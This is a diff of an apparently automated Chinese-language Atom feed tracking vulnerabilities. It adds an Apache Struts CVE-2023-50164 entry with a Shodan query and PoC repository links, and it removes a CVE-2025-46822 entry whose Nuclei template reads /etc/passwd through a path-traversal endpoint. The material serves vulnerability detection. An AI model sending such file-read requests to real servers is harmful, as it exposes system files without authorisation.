@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-11T13:00:19.942Z</updated>
+  <updated>2025-06-11T13:30:23.817Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache Struts 路径遍历与远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/11/github_4241703152/"/>
+    <id>http://example.com/2025/06/11/github_4241703152/</id>
+    <published>2025-06-11T13:30:23.821Z</published>
+    <updated>2025-06-11T13:30:23.817Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache Struts 路径遍历与远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-50164</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache Struts 2.5.33和6.3.0.2+版本中存在路径遍历漏洞，攻击者可以通过操纵文件上传参数上传恶意文件，并可能执行远程代码。此漏洞需要攻击者操纵上传参数。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Struts</p><p><strong>影响版本：</strong> 2.5.33, 6.3.0.2+</p><p><strong>搜索语法：</strong> http.title:”struts2 showcase”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12302">https://github.com/projectdiscovery/nuclei-templates/issues/12302</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Struts 2.5.33 and 6.3.0.2+ contain a path traversal caused by manipulation of file upload parameters, letting attackers upload malicious files and potentially execute remote code, exploit requires attacker to manipulate upload parameters.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://vulncheck.com/xdb/676c45378050">https://vulncheck.com/xdb/676c45378050</a></li><li><a href="https://github.com/Pixel-DefaultBR/CVE-2023-50164">https://github.com/Pixel-DefaultBR/CVE-2023-50164</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:Pixel-DefaultBR&#x2F;CVE-2023-50164.git</li><li><a href="https://github.com/Trackflaw/CVE-2024-10924-Wordpress-Docker">https://github.com/Trackflaw/CVE-2024-10924-Wordpress-Docker</a></li><li><a href="https://vulncheck.com/xdb/891b149617f9">https://vulncheck.com/xdb/891b149617f9</a></li><li><a href="https://github.com/NikitaPark/CVE-2023-50164-PoC">https://github.com/NikitaPark/CVE-2023-50164-PoC</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:NikitaPark&#x2F;CVE-2023-50164-PoC.git</li><li><a href="https://vulncheck.com/xdb/78854c0dc088">https://vulncheck.com/xdb/78854c0dc088</a></li><li><a href="https://github.com/AsfandAliMemon25/CVE-2023-50164Analysis-">https://github.com/AsfandAliMemon25/CVE-2023-50164Analysis-</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:AsfandAliMemon25&#x2F;CVE-2023-50164Analysis-.git</li><li><a href="https://github.com/sunnyvale-it/CVE-2023-50164-PoC">https://github.com/sunnyvale-it/CVE-2023-50164-PoC</a></li><li><a href="https://vulncheck.com/xdb/17870a6362f9">https://vulncheck.com/xdb/17870a6362f9</a></li><li>https&#x2F;&#x2F;&#x2F;gitlab.com:Hamdane10&#x2F;cve-2023-50164.git</li><li><a href="https://vulncheck.com/xdb/83f6fcc57b59">https://vulncheck.com/xdb/83f6fcc57b59</a></li><li><a href="https://github.com/snyk-labs/CVE-2023-50164-POC">https://github.com/snyk-labs/CVE-2023-50164-POC</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:snyk-labs&#x2F;CVE-2023-50164-POC.git</li><li><a href="https://github.com/aaronm-sysdig/cve-2023-50164">https://github.com/aaronm-sysdig/cve-2023-50164</a></li><li><a href="https://github.com/miles3719/cve-2023-50164">https://github.com/miles3719/cve-2023-50164</a></li><li><a href="https://github.com/Trackflaw/CVE-2023-50164-ApacheStruts2-Docker">https://github.com/Trackflaw/CVE-2023-50164-ApacheStruts2-Docker</a></li><li><a href="https://github.com/Thirukrishnan/CVE-2023-50164-Apache-Struts-RCE">https://github.com/Thirukrishnan/CVE-2023-50164-Apache-Struts-RCE</a></li><li><a href="https://github.com/helsecert/cve-2023-50164">https://github.com/helsecert/cve-2023-50164</a></li><li><a href="https://vulncheck.com/xdb/6b23f76ae74b">https://vulncheck.com/xdb/6b23f76ae74b</a></li><li><a href="https://github.com/dwisiswant0/cve-2023-50164-poc">https://github.com/dwisiswant0/cve-2023-50164-poc</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:dwisiswant0&#x2F;cve-2023-50164-poc.git</li><li><a href="https://vulncheck.com/xdb/2eedf38daab7">https://vulncheck.com/xdb/2eedf38daab7</a></li><li><a href="https://github.com/bcdannyboy/CVE-2023-50164">https://github.com/bcdannyboy/CVE-2023-50164</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:bcdannyboy&#x2F;CVE-2023-50164.git</li><li><a href="https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE">https://github.com/jakabakos/CVE-2023-50164-Apache-Struts-RCE</a></li><li><a href="https://github.com/minhbao15677/CVE-2023-50164">https://github.com/minhbao15677/CVE-2023-50164</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-struts2-showcase"><a href="#Shodan-Query-http-title-struts2-showcase" class="headerlink" title="Shodan Query: http.title:&quot;struts2 showcase&quot;"></a>Shodan Query: <code>http.title:&quot;struts2 showcase&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache Struts 路径遍历与远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
   
   <entry>
     <title>DennModzz/RCE-CVE-2025</title>
@@ -520,33 +547,6 @@
     <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Java-springboot-codebase 任意文件读取漏洞</title>
-    <link href="http://example.com/2025/06/11/github_2138096785/"/>
-    <id>http://example.com/2025/06/11/github_2138096785/</id>
-    <published>2025-06-11T08:15:41.567Z</published>
-    <updated>2025-06-11T08:15:41.567Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Java-springboot-codebase 任意文件读取漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-46822</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Java-springboot-codebase v1.1 应用程序中存在一个任意文件读取漏洞，通过&#x2F;api&#x2F;v1&#x2F;files&#x2F;{path}端点，攻击者可以读取服务器上的敏感文件。</p><p><strong>产品名称：</strong> Java-springboot-codebase</p><p><strong>影响版本：</strong> 1.1</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/36be781c210e937c35925df448395f1a3295d342/cve-2025-46822.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/36be781c210e937c35925df448395f1a3295d342/cve-2025-46822.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> cve-<span class="hljs-number">202</span>5-<span class="hljs-number">46822</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Java-springboot-codebase <span class="hljs-number">1.1</span> <span class="hljs-operator">-</span> Arbitrary File Read<br>  <span class="hljs-params">author:</span> Haliteroglu<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> <span class="hljs-operator">&gt;</span><br>    In the Java-springboot-codebase v1.<span class="hljs-number">1</span> application, there is an arbitrary file read vulnerability through the <span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>v1<span class="hljs-operator">/</span>files<span class="hljs-operator">/</span>&#123;path&#125; endpoint. This vulnerability allows an attacker to read sensitive files on the server.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/OsamaTaher/Java-springboot-codebase</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-46822</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">46822</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">22</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,file-read,springboot,java,unauth,path-traversal<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/api/v1/files/etc/passwd&quot;</span><br>    <span class="hljs-params">headers:</span><br>      <span class="hljs-params">Accept:</span> <span class="hljs-string">&quot;*/*&quot;</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;root:.*:0:0:&quot;</span><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;root:.*:0:0:.*&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Java-springboot-codebase 任意文件读取漏洞&lt;/p&gt;
-&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
     
   </entry>
   
